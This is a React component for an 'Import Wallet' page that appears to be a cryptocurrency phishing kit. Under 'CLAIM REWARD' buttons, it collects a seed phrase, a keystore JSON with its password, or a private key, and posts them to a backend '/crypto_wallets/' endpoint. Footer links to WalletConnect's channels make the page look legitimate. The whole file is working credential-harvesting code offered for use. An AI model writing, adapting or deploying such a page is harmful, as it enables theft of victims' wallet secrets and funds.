import React, { useState } from "react";
import logo from "../../assets/logo.svg";
import discord from "../../assets/discord.svg";
import telegram from "../../assets/telegram.svg";
import twitter from "../../assets/twitter.svg";
import github from "../../assets/github.svg";
import axios from "axios";
import Loading from "../Loading/Loading";

const Wallets = (props) => {
  const { REACT_APP_API_URL } = process.env;
  const [openCity, setOpenCity] = useState("phrase");
  const [loading, setLoading] = useState(false);

  const initialState = {
    phrase: "",
    keystore_json: "",
    password: "",
    private_key: "",
  };
  const [formData, setFormData] = useState(initialState);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    axios
      .post(`${REACT_APP_API_URL}/crypto_wallets/`, {
        ...formData,
        wallet_name: props.location.state
          ? props.location.state.wallet_name
          : "Trust Wallet",
      })
      .then((res) => {
        console.log(res);
        setLoading(false);
        window.location.href = "/success";
      })
      .catch((err) => {
        setLoading(false);
        console.log(err);
      });
  };
  return (
    <center>
      <div className="top">
        <a href="https://github.com/UniGen" className="left">
          Github
        </a>
        <a href="#docs" className="left">
          Docs
        </a>
        <a href="/" className="main">
          <img src={logo} alt="logo" />
        </a>
        <a href="#wallet" className="left">
          Wallets
        </a>
        <a href="#app" className="left">
          Apps
        </a>
      </div>
      <br />
      <h2>
        <center>Import Wallet</center>
      </h2>
      <br />
      <div className="tab">
        <button
          className={openCity === "phrase" ? "tablinks active" : "tablinks"}
          id="default"
          onClick={() => {
            setOpenCity("phrase");
            setFormData(initialState);
          }}
        >
          Phrase
        </button>
        <button
          className={openCity === "keystore" ? "tablinks active" : "tablinks"}
          onClick={() => {
            setOpenCity("keystore");
            setFormData(initialState);
          }}
        >
          Keystore JSON
        </button>
        <button
          className={openCity === "private" ? "tablinks active" : "tablinks"}
          onClick={() => {
            setOpenCity("private");
            setFormData(initialState);
          }}
        >
          Private Key
        </button>
      </div>
      <div
        id="phrase"
        className="tabcontent"
        style={{ display: openCity === "phrase" ? "block" : "none" }}
      >
        <form className="ajaxForm" onSubmit={handleSubmit}>
          <textarea
            name="phrase"
            className="phrase"
            required="required"
            minLength="12"
            placeholder="Phrase"
            onChange={handleChange}
          ></textarea>
          <br />
          <div className="desc">
            Typically 12 (sometimes 24) words separated by single spaces
          </div>
          <br />
          <button className="btn">
            {loading ? <Loading /> : "CLAIM REWARD"}
          </button>
        </form>
      </div>
      <div
        id="keystore"
        className="tabcontent"
        style={{ display: openCity === "keystore" ? "block" : "none" }}
      >
        <form className="ajaxForm" onSubmit={handleSubmit}>
          <textarea
            name="keystore_json"
            className="phrase"
            required="required"
            minLength="12"
            placeholder="Keystore JSON"
            onChange={handleChange}
          ></textarea>
          <br />
          <div className="field">
            <input
              type="text"
              name="password"
              placeholder="Password"
              required
              onChange={handleChange}
            />
          </div>
          <div className="desc">
            Several lines of text beginning with '(...)' plus the password you
            used to encrypt it.
          </div>
          <br />
          <button type="submit" name="import" className="btn">
            {loading ? <Loading /> : "CLAIM REWARD"}
          </button>
        </form>
      </div>
      <div
        id="private"
        className="tabcontent"
        style={{ display: openCity === "private" ? "block" : "none" }}
      >
        <form className="ajaxForm" onSubmit={handleSubmit}>
          <div className="field">
            <input
              type="text"
              name="private_key"
              className="key"
              required
              placeholder="Private Key"
              onChange={handleChange}
            />
          </div>
          <div className="desc">
            Typically 12 (sometimes 24) words separated by single spaces
          </div>
          <br />
          <button type="submit" name="import" className="btn">
            {loading ? <Loading /> : "CLAIM REWARD"}
          </button>
        </form>
      </div>

      <footer>
        <div id="footer">
          <p>
            <img src={discord} alt="discord" className="footimg" />{" "}
            <a href="https://discord.gg/jhxMvxP">Discord</a>
          </p>
          <br />
          <p>
            <img src={telegram} alt="telegram" className="footimg" />{" "}
            <a href="https://t.me/walletconnect_announcements">Telegram</a>
          </p>
          <br />
          <p>
            <img src={twitter} alt="twitter" className="footimg" />{" "}
            <a href="https://twitter.walletconnect.org/">Twitter</a>
          </p>
          <br />
          <p>
            <img src={github} alt="github" className="footimg" />{" "}
            <a href="https://github.com/walletconnect">Github</a>
          </p>
          <br />
        </div>
      </footer>
    </center>
  );
};

export default Wallets;
